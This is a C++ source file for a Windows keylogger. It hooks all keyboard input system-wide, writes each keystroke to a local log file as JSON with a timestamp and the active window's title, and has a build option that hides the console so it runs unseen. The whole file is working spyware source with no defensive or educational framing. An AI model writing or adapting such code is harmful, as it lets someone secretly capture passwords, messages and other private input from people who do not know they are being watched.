#include <fstream>
#include "json.hpp"
#include "keylogger.hpp"
#include "config.hpp"
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>
#include <windows.h>
#include "keylabels.cpp"

Keylogger::Keylogger(const std::string& filename) {
    logFile.open(filename, std::ios_base::app);
    hookHandle = nullptr;
    memset(lastWindow, 0, sizeof(lastWindow));
}

Keylogger::~Keylogger() {
    RemoveHook();
    if (logFile.is_open()) logFile.close();
}

void Keylogger::InstallHook() {
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0);
    if (!hookHandle) {
        MessageBoxA(nullptr, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void Keylogger::RemoveHook() {
    if (hookHandle) {
        UnhookWindowsHookEx(hookHandle);
        hookHandle = nullptr;
    }
}

void Keylogger::Run() {
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {}
}

LRESULT CALLBACK Keylogger::HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbData = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        GetInstance().LogKeystroke(kbData->vkCode);
    }
    return CallNextHookEx(GetInstance().hookHandle, nCode, wParam, lParam);
}

void Keylogger::LogKeystroke(int vkCode) {
#ifdef MOUSE_IGNORE
    if (vkCode == 1 || vkCode == 2) return;
#endif
    HWND activeWindow = GetForegroundWindow();
    DWORD threadId = 0;
    HKL keyboardLayout = nullptr;
    char windowTitle[256] = "Unknown";
    if (activeWindow) {
        threadId = GetWindowThreadProcessId(activeWindow, nullptr);
        keyboardLayout = GetKeyboardLayout(threadId);
        GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
    }
    std::stringstream keyLabel;
#if FORMAT == 10
    keyLabel << vkCode;
#elif FORMAT == 16
    keyLabel << std::hex << vkCode;
#else
    extern const std::map<int, std::string> keyLabels;
    if (keyLabels.count(vkCode)) {
        keyLabel << keyLabels.at(vkCode);
    } else {
        char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
        bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
        if (!isLowercase) ch = tolower(ch);
        keyLabel << ch;
    }
#endif
    time_t t = time(nullptr);
    struct tm timeInfo;
    localtime_s(&timeInfo, &t);
    char timeStr[64];
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S%z", &timeInfo);
    nlohmann::json logEntry = {
        {"timestamp", std::string(timeStr)},
        {"key", keyLabel.str()},
        {"window", std::string(windowTitle)}
    };
    logFile << logEntry.dump() << "\n";
    logFile.flush();
}

void Keylogger::SetConsoleVisibility() {
#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
    FreeConsole();
#endif
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
#endif
}

bool Keylogger::IsSystemBooting() {
    return false;
}

Keylogger& Keylogger::GetInstance() {
    static Keylogger instance(log_file_name);
    return instance;
} 